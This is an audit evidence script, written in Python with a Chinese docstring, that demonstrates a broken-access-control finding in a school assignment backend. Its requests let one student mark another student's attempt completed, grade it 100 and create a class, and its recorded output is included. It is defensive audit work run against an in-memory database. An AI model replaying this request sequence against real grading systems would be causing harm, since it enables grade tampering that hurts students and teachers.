"""N-01 取证探针：任何已登录学生可篡改任意作业尝试的状态与分数。

- 登记于：docs/audit/2026-08-26-phase3-interim-audit-report-v0.1.0.md 第 5 节 N-01
- 取证日期：2026-08-26
- 取证提交：audit/phase3-auth-control-realtime @ 7e33ea52
- 性质：**一次性只读探针**。内存 SQLite + TestClient，不连真实库、不修改仓库文件、
  不属于测试套件（不在 pytest 收集路径内，文件名不以 test_ 开头）。

复现：

    /Users/xuhehong/Desktop/r-mos/r-mos-backend/venv/bin/python -m dotenv \
      -f /Users/xuhehong/Desktop/r-mos/r-mos-backend/.env run -- \
      /Users/xuhehong/Desktop/r-mos/r-mos-backend/venv/bin/python \
      docs/audit/evidence/2026-08-26-n01-grade-tampering-probe.py

2026-08-26 在上述提交上的实际输出：

    教师 id=1  学生A id=2（尝试所有者）  学生B id=3
    attempt_id = 1
    --- 匿名对照（应 401，证明网关生效）---
      匿名 POST /attempts/1/grade -> 401
    --- 学生 B 改学生 A 的尝试状态 ---
      PATCH /attempts/1  -> 200        返回体 status = completed
    --- 学生 B 用自己的合法令牌，给学生 A 的尝试打 100 分 ---
      POST /attempts/1/grade  -> 200   返回体 score = 100.0
    --- 学生 B 读学生 A 的尝试证据 ---
      GET /attempts/1/evidence -> 404
    --- 学生 B 创建班级（教学写操作）---
      POST /classes -> 201
    数据库最终状态: score=100.0  status=graded

注意执行顺序：必须先 PATCH 状态为 completed，grade 才不会被业务规则以 409 挡下。
409 是业务规则拦截，**不是**权限拦截——这一点决定了该发现的严重性等级。

若脚本中的绝对路径失效（工作区被移动/删除），请改 sys.path 的插入路径。
"""

import asyncio
import sys
from uuid import uuid4

sys.path.insert(0, "/Users/xuhehong/Desktop/r-mos/.worktrees/phase3-auth-control-realtime/r-mos-backend")

from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine
from sqlalchemy.pool import StaticPool

import app.models as app_models  # noqa: F401
from app.core.database import get_db
from app.models.base import Base
from app.models.school import School
from app.models.teaching import Assignment, AssignmentAttempt
from main import app

SCHOOL = "探针学校"

engine = create_async_engine(
    "sqlite+aiosqlite:///:memory:",
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)


async def init():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
        await conn.execute(School.__table__.insert().values(name=SCHOOL))


asyncio.run(init())
sf = async_sessionmaker(engine, expire_on_commit=False)


async def _get_db():
    async with sf() as s:
        yield s


app.dependency_overrides[get_db] = _get_db


def reg(client, role, teacher_id=None):
    email = f"probe_{uuid4().hex[:8]}@example.com"
    payload = {
        "email": email, "password": "StrongPass123", "full_name": "probe",
        "role": role, "school_name": SCHOOL,
    }
    if teacher_id:
        payload["teacher_id"] = teacher_id
    r = client.post("/api/v1/auth/register", json=payload)
    assert r.status_code == 201, r.text
    uid = int(r.json()["user_id"])
    lg = client.post("/api/v1/auth/login", json={"email": email, "password": "StrongPass123"})
    return uid, {"Authorization": f"Bearer {lg.json()['access_token']}"}


with TestClient(app) as client:
    teacher_id, th = reg(client, "teacher")
    stu_a, ha = reg(client, "student", teacher_id)
    stu_b, hb = reg(client, "student", teacher_id)

    # 造班级/作业/尝试：尝试属于学生 A
    async def seed():
        async with sf() as s:
            from app.models.teaching import TeachingClass as Class
            klass = Class(name="探针班", teacher_id=teacher_id)
            s.add(klass)
            await s.flush()
            a = Assignment(class_id=klass.id, title="探针作业")
            s.add(a)
            await s.flush()
            at = AssignmentAttempt(
                assignment_id=a.id, student_id=stu_a, status="in_progress", attempt_index=1
            )
            s.add(at)
            await s.commit()
            await s.refresh(at)
            return at.id

    attempt_id = asyncio.run(seed())

    print(f"教师 id={teacher_id}  学生A id={stu_a}（尝试所有者）  学生B id={stu_b}")
    print(f"attempt_id = {attempt_id}\n")

    print("--- 匿名对照（应 401，证明网关生效）---")
    r = client.post(f"/api/v1/attempts/{attempt_id}/grade", json={"score": 100})
    print(f"  匿名 POST /attempts/{attempt_id}/grade -> {r.status_code}")

    print("\n--- 学生 B 改学生 A 的尝试状态 ---")
    r2 = client.patch(f"/api/v1/attempts/{attempt_id}", json={"status": "completed"}, headers=hb)
    print(f"  PATCH /attempts/{attempt_id}  -> {r2.status_code}")
    if r2.status_code == 200:
        print(f"  返回体 status = {r2.json().get('status')}")

    print("\n--- 学生 B 用自己的合法令牌，给学生 A 的尝试打 100 分 ---")
    r = client.post(f"/api/v1/attempts/{attempt_id}/grade", json={"score": 100}, headers=hb)
    print(f"  POST /attempts/{attempt_id}/grade  -> {r.status_code}")
    if r.status_code == 200:
        print(f"  返回体 score = {r.json().get('score')}")

    print("\n--- 学生 B 读学生 A 的尝试证据 ---")
    r3 = client.get(f"/api/v1/attempts/{attempt_id}/evidence", headers=hb)
    print(f"  GET /attempts/{attempt_id}/evidence -> {r3.status_code}")

    print("\n--- 学生 B 创建班级（教学写操作）---")
    r4 = client.post("/api/v1/classes", json={"name": "学生建的班", "teacher_id": stu_b}, headers=hb)
    print(f"  POST /classes -> {r4.status_code}")

    # 落库确认
    async def check():
        async with sf() as s:
            at = await s.get(AssignmentAttempt, attempt_id)
            return at.score, at.status

    score, status = asyncio.run(check())
    print(f"\n数据库最终状态: score={score}  status={status}")

app.dependency_overrides.clear()
